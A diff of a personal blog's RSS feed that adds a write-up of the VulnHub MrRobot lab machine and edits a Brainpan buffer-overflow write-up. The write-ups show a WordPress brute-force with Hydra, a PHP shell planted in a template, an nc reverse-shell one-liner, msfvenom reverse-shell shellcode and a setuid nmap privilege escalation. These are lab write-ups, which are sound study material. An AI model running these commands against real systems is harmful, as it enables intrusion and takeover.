@@ -6,9 +6,64 @@
 </description>
     <link>http://localhost:4000/</link>
     <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Tue, 04 Aug 2020 08:35:54 -0400</pubDate>
-    <lastBuildDate>Tue, 04 Aug 2020 08:35:54 -0400</lastBuildDate>
+    <pubDate>Wed, 05 Aug 2020 10:18:22 -0400</pubDate>
+    <lastBuildDate>Wed, 05 Aug 2020 10:18:22 -0400</lastBuildDate>
     <generator>Jekyll v4.1.1</generator>
+    
+      <item>
+        <title>MrRobot: 1 Write-Up</title>
+        <description>&lt;p&gt;MrRobot 1 is an intermediate OSCP-like machine (according to the &lt;a href=&quot;https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms&quot;&gt;Abatchy’s list&lt;/a&gt;) hosted on Vulnhub. This machine is a little bit different from the other ones, in this one the goal is to read the three hidden keys in the machine.&lt;/p&gt;
+&lt;h1&gt;Network Scan&lt;/h1&gt;
+&lt;p&gt;As always, I’ve used Nmap to sweep the network and get the IP of the target machine.
+&lt;img src=&quot;netScan.png&quot; alt=&quot;NetScan&quot; /&gt;
+The IP of the target machine is 192.168.56.13.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h1&gt;Port Scan&lt;/h1&gt;
+&lt;p&gt;&lt;img src=&quot;portScan.png&quot; alt=&quot;PortScan&quot; /&gt;
+There are only two ports open (80 and 443) and both of them host the same webpage.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h1&gt;Port 80 Enumeration&lt;/h1&gt;
+&lt;p&gt;The root page has an interactive MrRobot themed page but it doesn’t lead to anything useful. Nikto found that the site has WordPress 4.3.1 installed and I found some entries inside the robots.txt file.
+&lt;img src=&quot;nikto.png&quot; alt=&quot;Nikto Output&quot; /&gt;
+&lt;img src=&quot;robots.png&quot; alt=&quot;Robots.txt&quot; /&gt;
+The key-1-of-3.txt file contains the first key while fsocity.dic is a dictionary with some repetitions. I removed the repetitions using “cat port80/fsocity.dic | sort | uniq &amp;gt; port80/fsocityFilt.dic”
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h1&gt;WordPress Bruteforce&lt;/h1&gt;
+&lt;p&gt;I noticed that the WordPress login page error message was “Invalid username”, so I tried to bruteforce the username using Hydra. To do so I used the Network Firefox utility to get the necessary parameters to login.
+&lt;img src=&quot;postParams.png&quot; alt=&quot;POST Parameters&quot; /&gt; 
+&lt;img src=&quot;invalidUser.png&quot; alt=&quot;Invalid username message&quot; /&gt;
+&lt;img src=&quot;hydra1.png&quot; alt=&quot;Hydra User Bruteforce&quot; /&gt;
+Hydra found the “Elliot” username, so I tried to bruteforce his password using the fsocity dictionary.
+&lt;img src=&quot;invalidPass.png&quot; alt=&quot;Invalid password message&quot; /&gt;
+&lt;img src=&quot;hydra2.png&quot; alt=&quot;Hydra Password Bruteforce&quot; /&gt;&lt;/p&gt;
+&lt;h1&gt;WordPress Access&lt;/h1&gt;
+&lt;p&gt;Using the credentials found with Hydra I logged in as Elliot, who has Administrator privileges.
+&lt;img src=&quot;wordpressUsers.png&quot; alt=&quot;WordPress Users&quot; /&gt;
+With the Administrator privileges we can simply edit a php file of the template with a simple php shell (I used 404.php because it is easy to get it executed). I also found that we can upload a malicious plugin or try to use both CVE-2019-8942 and CVE-2019-8943 to get RCE (I wasn’t able to exploit them).
+&lt;img src=&quot;404Edit.png&quot; alt=&quot;Editing 404&quot; /&gt;
+Once I had the simple shell I executed “rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.56.10 1234 &amp;gt;/tmp/f” to get a reverse shell.
+&lt;img src=&quot;revShell1.png&quot; alt=&quot;Reverse shell 1&quot; /&gt;
+&lt;img src=&quot;revShell2.png&quot; alt=&quot;Reverse shell 2&quot; /&gt;&lt;/p&gt;
+&lt;h1&gt;Daemon Shell&lt;/h1&gt;
+&lt;p&gt;I found the second key and a MD5 hash inside the /home/robot/ directory, but the key wasn’t readable with my user, so I used hashcat to crack the hash.
+&lt;img src=&quot;lsRobotHome.png&quot; alt=&quot;ls /home/robot/&quot; /&gt;
+&lt;img src=&quot;passwordMD5.png&quot; alt=&quot;password.raw-md5&quot; /&gt;
+&lt;img src=&quot;hashcat.png&quot; alt=&quot;Hashcat cracking&quot; /&gt;
+Hashcat cracked the hash successfully, giving us the password “abcdefghijklmnopqrstuvwxyz”.&lt;/p&gt;
+&lt;h1&gt;Robot Shell and Privesc to Root&lt;/h1&gt;
+&lt;p&gt;Using “su robot” with the “abcdefghijklmnopqrstuvwxyz” password I got access to the robot user. Running LinEnum I saw that Nmap was installed in the machine and that it had the SetUID bit enabled. Nmap has an interactive mode, so I used it to get a shell with an efective user id of 0 (root). I know that there are methods to get UID == 0, but having only the EUID was fine for me. The last key was inside /root/.
+&lt;img src=&quot;privesc.png&quot; alt=&quot;PrivEsc to root&quot; /&gt;&lt;/p&gt;
+&lt;h1&gt;Conclusions&lt;/h1&gt;
+&lt;p&gt;This is a really straightforward machine if you know what are you doing, so I don’t really get why it is rated as intermediate. Nevertheless, it is a funny machine to root, even though it is a little bit too CTF-like for me.&lt;/p&gt;
+</description>
+        <pubDate>Wed, 05 Aug 2020 00:00:00 -0400</pubDate>
+        <link>http://localhost:4000/write-ups/mrrobot_1_writeup/</link>
+        <guid isPermaLink="true">http://localhost:4000/write-ups/mrrobot_1_writeup/</guid>
+        
+        
+        <category>write-ups</category>
+        
+      </item>
     
       <item>
         <title>Brainpan: 1 Write-Up</title>
@@ -47,13 +102,13 @@ I attempted to bruteforce the password while I was examining the code using Olly
         &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;fi
 done&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;I found the password when I was reading the get_reply function (the string that was being passed as a parameter to strcmp), but using it didn’t do anything. I also noticed that the program uses the strcpy function, which is unsafe.
+&lt;p&gt;I found the password when I was reading the get_reply function (the string that is being passed as a parameter to strcmp), but using it didn’t do anything. I also noticed that the program uses the strcpy function, which is unsafe.
 &lt;img src=&quot;ollyDBGCode.png&quot; alt=&quot;Olly Code&quot; /&gt;
-I used msf-pattern_create to generate a pattern with 1000 characters to test if the application would crash and then I used msf-pattern_offset to get the exact position.
+I used msf-pattern_create to generate a pattern with 1000 characters to test if the application crashes and then I used msf-pattern_offset to get the exact position.
 &lt;img src=&quot;BOFTest1.png&quot; alt=&quot;BOF Test 1&quot; /&gt;
 &lt;img src=&quot;BOFTest2.png&quot; alt=&quot;BOF Test 2&quot; /&gt; 
 &lt;img src=&quot;BOFTest3.png&quot; alt=&quot;BOF Test 3&quot; /&gt;
-To control the EIP register we need to send 524 junk bytes and the direction where we want to jump. I also found a function called winkwink with a “JMP esp” instruction at 0x311712F3, which means we can try to execute some shellcode (I should have checked the memory protections to see if NX was enabled, but I didn’t know how to do this with OllyDbg and I didn’t have a Windows VM prepared).&lt;br /&gt;
+To control the EIP register we need to send 524 junk bytes and the direction where we want to jump. I also found a function called winkwink with a “JMP esp” instruction at 0x311712F3, which means that we can try to execute some shellcode (I should have checked the memory protections to see if NX was enabled, but I didn’t know how to do this with OllyDbg and I didn’t have a Windows VM prepared).&lt;br /&gt;
 I generated two shellcodes, one for Windows and the other one for Linux using msfvenom.&lt;/p&gt;
 
 &lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;192.168.56.10 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1234 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; py &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; shellcode &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; x86 –platform Windows &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0a&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#Windows shellcode&lt;/span&gt;
@@ -80,7 +135,7 @@ msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; linux/x86/shell_revers
 &lt;span class=&quot;c1&quot;&gt;#Payload with 16 NOPs
 &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;retAddr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 
-&lt;p&gt;I used the Linux shellcode because I knew that the target machine was using Linux (and I already tested it in my machine).
+&lt;p&gt;I used the Linux shellcode because I knew that the target machine was using Linux (and I already tested it in my machine, so I knew that it would work).
 &lt;img src=&quot;remoteShell1.png&quot; alt=&quot;Remote shell 1&quot; /&gt;
 &lt;img src=&quot;remoteShell2.png&quot; alt=&quot;Remote shell 2&quot; /&gt;
 &lt;br /&gt;&lt;/p&gt;
@@ -88,7 +143,7 @@ msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; linux/x86/shell_revers
 &lt;p&gt;Running sudo -l we can see that puck can run a script as root without suppling the password. This script has three functions (network, proclist and manual). The manual function runs the man command with the argument that we supply.
 &lt;img src=&quot;sudoPuck.png&quot; alt=&quot;Sudo -l&quot; /&gt;
 &lt;img src=&quot;functions.png&quot; alt=&quot;Functions&quot; /&gt;
-The man command uses a pager to show the manual and this pager allows us to run commands (and even to get a shell). I won’t explain the method but &lt;a href=&quot;https://gtfobins.github.io/gtfobins/man/&quot;&gt;I’ll leave a link to it&lt;/a&gt;.
+The man command uses a pager to show the manual and this pager allows us to run commands. I won’t explain the method but &lt;a href=&quot;https://gtfobins.github.io/gtfobins/man/&quot;&gt;I’ll leave a link to it&lt;/a&gt;.
 &lt;img src=&quot;privesc.png&quot; alt=&quot;privesc&quot; /&gt;&lt;/p&gt;
 &lt;h1&gt;Conclusions&lt;/h1&gt;
 &lt;p&gt;This is a really fun and a bit difficult machine that helped me practising buffer overflow. I’ve learnt about the NOP sled technique and the importance of having a Windows VM to test programs in there (I’ll work on this in the future).&lt;/p&gt;
